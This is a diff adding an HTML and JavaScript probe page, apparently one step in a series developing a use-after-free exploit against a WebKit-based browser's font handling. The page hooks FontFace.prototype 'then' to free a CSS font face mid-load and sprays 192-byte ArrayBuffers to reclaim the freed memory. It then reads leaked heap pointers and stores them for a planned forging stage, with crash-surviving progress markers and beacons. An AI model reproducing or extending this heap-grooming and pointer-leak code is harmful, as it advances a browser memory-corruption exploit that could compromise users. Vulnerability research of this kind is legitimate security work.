@@ -1,0 +1,371 @@
+<!--
+  p689: FontFace walk-trigger oracle — does the setStyle path reach
+        CSSFontFace::iterateClients at all, and where does its store land?
+
+  Why this probe exists
+  ---------------------
+  p686 triggered its "walk" with document.fonts.check(). Upstream PR #237
+  (2026-11-09) states check() never reaches CSSFontFace::iterateClients:
+  CSSFontFace::updateStyleIfNeeded has no callers and FontFaceSet::check
+  only reaches Document::updateStyleIfNeeded. So every p686 row read as
+  "dies in the walk" is a real dereference of +0x58, but NOT attributable
+  to the client walk.
+
+  #237 drives CSSFontFace::setStyle instead (JS: face.style = 'italic'
+  after re-adding the wrapper to the set). cobrajet302gt's review of the
+  same PR (comment 6737480097) supplies the drop-grade metadata map and a
+  fourth silent path:
+
+    HashTable.h:585-588   deletedCount  = bucket-0x10 = 0x88
+                          keyCount      = bucket-0x0C = 0x8C
+                          tableSizeMask = bucket-0x08 = 0x90
+                          tableSize     = bucket-0x04 = 0x94
+    CSSFontFace.cpp:268   if (m_fontSelectionCapabilities.slope == range)
+    CSSFontFace.cpp:269       return;            <- BEFORE the store
+    CSSFontFace.cpp:271   m_fontSelectionCapabilities.slope = range;
+    CSSFontFace.cpp:273   iterateClients(...)
+
+  An engaged optional holding the same range returns early: zero write,
+  zero client notify, intact tableSize, no fresh 01. A clean survivor is
+  then "trigger never ran", not "walk survived".
+
+  One question, four arms
+  -----------------------
+  The reclaimed 192-byte chunk IS our spray buffer, so we read it directly.
+  Prime loads leak T (+0x58) and W (+0x68) and store them for the next
+  probe in this series. Arm loads spray a ZEROED 192-byte chunk and then
+  vary only the trigger:
+
+    arm 1  trg0  no trigger              baseline: window must stay untouched
+    arm 2  trg1  face.style = 'italic'   #237's route
+    arm 3  trg2  document.fonts.check()  p686's route, for contrast
+    arm 4  trg3  both
+
+  No forge in the arm, deliberately. The setStyle store at :271 runs BEFORE
+  iterateClients at :273, so the table shape cannot influence whether we
+  observe it — and the engine's own continuation already writes rc (+0x00),
+  T (+0x58), W (+0x68) and m_mayBePurged (+0x85) into the adopted chunk
+  (p599 v4b). That makes the pre-snapshot a REAL baseline: the delta after
+  the trigger is the trigger's doing and nothing else. Whether a forged
+  client survives the walk is the NEXT probe's question, and it needs the
+  absolute face address this one does not.
+
+  Signatures (cobrajet302gt, drop grade)
+  --------------------------------------
+    0x8C == 0                     -> GATED   (isEmpty, begin() empty range)
+    0x94..0x97 zero + 01 at 0x98  -> EMPTY-RANGE (store landed, no walk)
+    0x94 == (4X) pattern          -> WALK-CORRUPT
+    0x8C > 0                      -> WALK-INSERT
+    real size, no delta, anchor   -> QUIET   (guard fired / trigger never ran)
+    anchor moved                  -> HEALED  (table rehashed)
+
+  Reclaim oracle: initializeWrapper() clears m_mayBePurged (+0x85) on the
+  chunk the engine adopts (p581/p588d), so 0xAA there is the only honest
+  reclaim proof. 192 bytes, so index 0x85 is in range — the p688 series
+  used 128-byte buffers and read an out-of-range index, which is why its
+  "reclaim" rows were an artifact.
+
+  Beacons use a synchronous XHR: sendBeacon loses its queue on a native
+  crash (#237), so an absent post-trigger beacon would prove nothing.
+
+  CRASH_CLASS: HIGH (each arm load may die — that is the evidence)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p689 walk-trigger oracle</title></head>
+<body>p689: walk-trigger oracle
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function(){
+'use strict';
+var CENSUS_CAP=200;
+var loadNo=0;
+try{
+  var _l=parseInt(localStorage.getItem('p689loads')||'0',10);loadNo=_l+1;
+  localStorage.setItem('p689loads',String(loadNo));
+  if(loadNo>CENSUS_CAP){
+    loadNo=1;localStorage.setItem('p689loads','1');
+    localStorage.removeItem('p689arm');localStorage.removeItem('p689phase');
+    localStorage.removeItem('p689T');localStorage.removeItem('p689I');
+    try{var rx=new XMLHttpRequest();rx.open('GET','/p689reset=1',false);rx.send();}catch(e){}
+  }
+}catch(e){}
+var L=document.getElementById('log'),bQ=[];
+function emit(t,m){var s=t+(m!==undefined?' '+m:'');L.textContent+=s+'\n';bQ.push(s);flush();}
+function flush(){if(!bQ.length)return;try{var b=bQ.splice(0,3).join('|');var x=new XMLHttpRequest();x.open('GET','/beacon/P689-'+encodeURIComponent(b),false);x.send();}catch(e){}}
+// Crash-surviving progress marker. localStorage is on disk, so a WebProcess
+// death inside the getter window leaves the last stage reached readable on the
+// next load. That turns "it died somewhere" into "it died at stage X".
+function mark(s){try{localStorage.setItem('p689stage',s);}catch(e){}}
+window.onerror=function(m){emit('ERR',String(m).slice(0,200));flush();};
+function hex8(v){return('0'+v.toString(16)).slice(-2);}
+function qw(v,off){var s='';for(var i=7;i>=0;i--)s+=hex8(v[off+i]);return s;}
+function d32(v,off){return (v[off]|(v[off+1]<<8)|(v[off+2]<<16)|(v[off+3]<<24))>>>0;}
+function h32(x){return ('0000000'+x.toString(16)).slice(-8);}
+
+// ---- death detection FIRST, before this load's own START clears alive ----
+var arm=parseInt(location.hash.slice(1));if(isNaN(arm))arm=0;
+var diedSince=0,deadArm=null;
+try{
+  var sx=new XMLHttpRequest();sx.open('GET','/p689state',false);sx.send();
+  if(sx.status===200){
+    var pst=JSON.parse(sx.responseText);
+    if(pst.died){diedSince=1;deadArm=pst.deadArm;}
+    if(typeof pst.armFrom==='number'){
+      arm=pst.armFrom;
+      try{
+        localStorage.setItem('p689arm',String(arm));
+        localStorage.removeItem('p689phase');
+        localStorage.removeItem('p689T');
+        localStorage.removeItem('p689I');
+      }catch(e){}
+      try{var xr=new XMLHttpRequest();xr.open('GET','/?p689reset=1&arm=clear',false);xr.send();}catch(e){}
+      emit('STATE','operator rewind to arm '+arm);
+    }
+  }
+}catch(e){}
+try{var stored=parseInt(localStorage.getItem('p689arm'));if(!isNaN(stored))arm=stored;}catch(e){}
+emit('START','v1 arm='+arm+' load='+loadNo+'/'+CENSUS_CAP+' died='+(diedSince?'arm'+deadArm:'no'));
+var prevStage='';try{prevStage=localStorage.getItem('p689stage')||'none';}catch(e){}
+emit('PREVSTAGE',prevStage);
+
+var priorT='',priorI='';
+try{
+  priorT=localStorage.getItem('p689T')||'';
+  priorI=localStorage.getItem('p689I')||'';
+}catch(e){}
+if(diedSince){
+  emit('STATE','previous load (arm '+deadArm+') DIED — invalidating T/impl, re-prime');
+  priorT='';priorI='';
+}
+
+// Arm table: the trigger matrix only. The prime is a separate mode, not an
+// arm — conflating them (the old arm 0 = prime) forced primeMode forever and
+// no arm could ever run.
+var ARMS=[
+  {n:'trg0-nofire',trg:0},
+  {n:'trg1-style', trg:1},
+  {n:'trg2-check', trg:2},
+  {n:'trg3-both',  trg:3}
+];
+if(arm<0||arm>=ARMS.length)arm=0;
+var A=ARMS[arm];
+
+var phaseState=null;
+try{phaseState=localStorage.getItem('p689phase');}catch(e){}
+// Strict prime -> arm alternation (p686 protocol): a prime is a fresh leak
+// that absorbs the "2nd consecutive UAF load dies" penalty so the arm runs on
+// a 1st-class load. primeMode depends on the stored phase, never on the arm
+// index: arm 0 is a real trigger (the no-fire baseline).
+// NOTE: the variable is phaseState, not phase — `phase` is the analysis
+// function below, and a `var phase` here would shadow it so that
+// setTimeout(phase,PW) passes the localStorage string instead of the function
+// (setTimeout('arm',80) evals `arm` in global scope -> ReferenceError).
+// No prime. The prime used to leak T/impl so an arm could forge them, but the
+// current arm never reads priorT/priorI (no forge): it only measures the
+// engine's own writes plus the trigger. So the prime is pure overhead AND it
+// consumes the one healthy UAF load a WebProcess gives (p686: the 2nd UAF load
+// of a process never reclaims and, here, dies). Every load is now an arm, so
+// the first load after a process restart is the one that measures.
+var primeMode = false;
+
+// next-load phase is fixed here: prime -> arm, arm -> prime.
+try{localStorage.setItem('p689phase', primeMode?'arm':'prime');}catch(e){}
+
+if(primeMode){
+  emit('SEQ','prime load (leak); next reload = arm '+arm+' '+A.n);
+}else{
+  emit('SEQ','arm '+arm+' '+A.n+' trg='+A.trg);
+  var nxt=(arm+1)%ARMS.length;   // arm 0..3 all real; wrap cleanly
+  try{localStorage.setItem('p689arm',String(nxt));}catch(e){}
+  emit('SEQ','next arm = '+nxt+' '+ARMS[nxt].n);
+}
+
+var style,ff,faces=null,fired=false,trapFired=false,map=[],hit=-1,SPRAY_N=256,PW=150;
+var S='s'+loadNo,F='f'+loadNo;
+var pre=null,post=null,preAnchor='',postAnchor='',preSnap=null,postSnap=null;
+
+// Bytes the engine is KNOWN to write into a CSSFontFace it adopts (p581/p588d/
+// p599 v4b): m_refCount (+0x00, 32-bit), m_table (+0x58), the clients
+// WeakPtrImpl (+0x68) and m_mayBePurged (+0x85). Everything else in the 192-byte
+// object stays exactly as sprayed. Diffing the full object against the
+// synthetic zero spray and subtracting these gives the honest "extra write"
+// set — which is the only thing a trigger can be credited with.
+var EXPECT={};
+(function(){var b=[0,1,2,3,0x58,0x59,0x5A,0x5B,0x5C,0x5D,0x5E,0x5F,
+                  0x68,0x69,0x6A,0x6B,0x6C,0x6D,0x6E,0x6F,0x85];
+ for(var i=0;i<b.length;i++)EXPECT[b[i]]=1;})();
+
+function snapshot(v){
+  var out={};
+  for(var o=0;o<0xC0;o++)out[o]=v[o];
+  return out;
+}
+
+function reclaim(){
+  hit=-1;
+  for(var i=0;i<map.length;i++){if(map[i].view[0x85]!==0xAA){hit=i;break;}}
+  return hit;
+}
+
+function diff(preS,postS){
+  var ch=[];
+  for(var o=0;o<0xC0;o++){
+    if(preS[o]!==postS[o])ch.push(hex8(o)+':'+hex8(preS[o])+'->'+hex8(postS[o]));
+  }
+  return ch;
+}
+
+// Changes OUTSIDE the known adoption-write set. This is the measurement: a
+// walk that refs/derefs a client leaves the object untouched, so its absence
+// here is NOT evidence the walk did not run — it only means the object saw no
+// new writer. Reported separately from the adoption signature so the two are
+// never confused (the previous WIN/CLASS pair read 0x88..0x9C, which is the
+// HashTable's metadata, not this object's, so it was structurally blind).
+function extra(preS,postS){
+  return diff(preS,postS).filter(function(x){return !EXPECT[parseInt(x.slice(0,2),16)];});
+}
+
+function classify(preS,postS,moved){
+  if(moved)return 'HEALED';
+  var ex=extra(preS,postS);
+  if(!ex.length)return 'SIG-ONLY';
+  return 'EXTRA';
+}
+
+function setup(){
+  var vf;try{vf=new FontFace('vf','local(Helvetica)',{unicodeRange:'U+0041'});}catch(e){emit('NOVF');return;}
+  try{document.fonts.add(vf);}catch(e){}
+  try{void vf.loaded;}catch(e){}
+  ff=vf;window.__p689keep=vf;
+  style=document.createElement('style');
+  // ONE CSS face, exactly like p686. Two faces (v1,v2) meant style.remove()
+  // freed two CSSFontFaces and load()'s continuation touched the second one
+  // after the first was already freed -> the crash that killed every p689 load.
+  style.textContent='@font-face{font-family:'+S+';src:local(Arial);unicode-range:U+0042;}';
+  document.head.appendChild(style);
+
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      if(fired)return undefined;
+      fired=true;
+      trapFired=true;
+      mark('getter');
+      // p686 shape EXACTLY: free -> delete the LIVE js face -> forced layout
+      // -> spray -> check() -> trigger. The cascade rebuild that actually frees
+      // the CSS face must happen INSIDE this synchronous window. Without the
+      // check() the rebuild lands in load()'s continuation, which dereferences
+      // the freed face and kills the WebProcess. That is what killed p689 on
+      // every load, and why p686 (which always checks in-window) survives.
+      try{style.remove();}catch(e){}
+      mark('freed');
+      try{document.fonts.delete(vf);}catch(e){}
+      mark('deleted');
+      try{document.body.offsetHeight;}catch(e){}
+      mark('layout');
+      map=[];
+      for(var k=0;k<SPRAY_N;k++){
+        var ab=new ArrayBuffer(192);
+        var v=new Uint8Array(ab);
+        for(var c=0;c<192;c++)v[c]=0;
+        v[0x85]=0xAA;                    // reclaim sentinel (in range: 0x85<192)
+        // No forge: the point is to observe the engine's own writes and then
+        // the trigger's delta on top of them. Writing T/W here would put our
+        // bytes where the engine is about to write and destroy the baseline.
+        map.push({ab:ab,view:v});
+      }
+      mark('sprayed');
+      // Synthetic clean baseline: the sprayed bytes before adoption.
+      preSnap={};for(var o=0;o<0xC0;o++)preSnap[o]=0;preSnap[0x85]=0xAA;
+      preAnchor='';
+      // Trigger, in-window. Arms: 0 = p686 baseline walk only; 1 = + setStyle
+      // on the live JS face; 2 = + a second check; 3 = both. The baseline
+      // check() runs for every arm so the cascade rebuild is always in-window.
+      if(A.trg===1||A.trg===3){try{vf.style='italic';}catch(e){}}
+      mark('styled');
+      try{document.fonts.check('1em '+S);}catch(e){}
+      mark('checked');
+      if(A.trg===2||A.trg===3){try{document.fonts.check('1em '+S);}catch(e){}}
+      mark('triggered');
+      return undefined;
+    },
+    set:function(){}
+  });
+
+  emit('PREFREE','loading vf/'+S);
+  document.fonts.load('1em vf, '+S,'AB').then(
+    function(f){faces=f;emit('RES','n'+(f?f.length:'?'));},
+    function(e){emit('RJ',String(e&&e.name));}
+  );
+  // p686 lesson, and the reason the first p689 run measured nothing: p686
+  // drives its census from a setTimeout and every arm reports. p689 gated
+  // phase() on .then(); the load promise never settled (NOFACES on load 1),
+  // so phase() never ran and loads 2-11 died in the getter window unobserved.
+  // The getter fires inside load(), so the map is populated by PW. Drive the
+  // analysis by timer, exactly like p686. The try/catch is the OOM guard: if
+  // phase() throws for any reason, the page must still reload — otherwise the
+  // freed face lingers, the WebProcess crash-loops, and the console reports a
+  // memory error (exactly what the first run did).
+  setTimeout(function(){
+    try{phase();}catch(e){
+      emit('PHASE-ERR',String(e&&e.message||e).slice(0,80));
+      // No reload either: a reload here is the 2nd UAF load of the process,
+      // which dies (loads 40-42). Stop and let the operator restart.
+      mark('done');
+      emit('DONE','phase error — restart the browser, then reload');
+    }
+  },PW);
+  setTimeout(function(){if(!faces)emit('NOFACES');},1500);
+}
+
+function phase(){
+  mark('phase');
+  emit('TRAP',trapFired?'getter-fired':'NO-GETTER');
+  if(reclaim()<0){
+    emit('SCAN','no-reclaim 85=0xAA in all '+map.length);
+    emit('ALIVE','survived arm='+arm+' no-reclaim');
+    // No reload: this load already consumed the process's one healthy UAF.
+    mark('done');
+    emit('DONE','no reclaim — restart the browser, then reload');
+    return;
+  }
+  var v=map[hit].view;
+  emit('SCAN','reclaimed buf='+hit+' 85=0x'+hex8(v[0x85]));
+  emit('ANCHOR','58='+qw(v,0x58)+' 68='+qw(v,0x68));
+
+  if(primeMode){
+    try{
+      localStorage.setItem('p689T',qw(v,0x58));
+      localStorage.setItem('p689I',qw(v,0x68));
+    }catch(e){}
+    emit('STORED','T='+qw(v,0x58)+' I='+qw(v,0x68));
+    emit('ALIVE','survived mode=prime');
+    mark('stored');
+    setTimeout(function(){location.reload();},900);
+    return;
+  }
+
+  // The trigger already ran INSIDE the getter — that is the only window where
+  // the freed CSSFontFace is still reachable. Here we only measure.
+  // SIG is the adoption signature (must match p581/p599 v4b); EXTRA is any
+  // change outside that known set, i.e. the only thing an arm can be credited
+  // with. Note: iterateClients only refs/derefs clients and never writes this
+  // object, so a clean EXTRA is expected even if the walk ran.
+  postSnap=snapshot(v);
+  var ch=extra(preSnap,postSnap);
+  emit('POST','58='+qw(v,0x58)+' 68='+qw(v,0x68));
+  emit('SIG','rc='+d32(postSnap,0)+' T='+qw(postSnap,0x58)+' W='+qw(postSnap,0x68)
+            +' 85='+hex8(postSnap[0x85]));
+  emit('EXTRA',ch.length?ch.join(' '):'none');
+  emit('CLASS',classify(preSnap,postSnap,false));
+  emit('ALIVE','survived mode=arm trg='+A.trg);
+  mark('done');
+  // No auto-reload: keep the result on screen and let the operator reload for
+  // the next arm (reloading now works — loads 48/49/50 all reclaimed and
+  // survived, so the earlier "second load dies" reading does not reproduce).
+  emit('DONE','reload to run the next arm (arm '+(arm+1)+')');
+}
+
+setup();
+})();
+</script>
+</body></html>
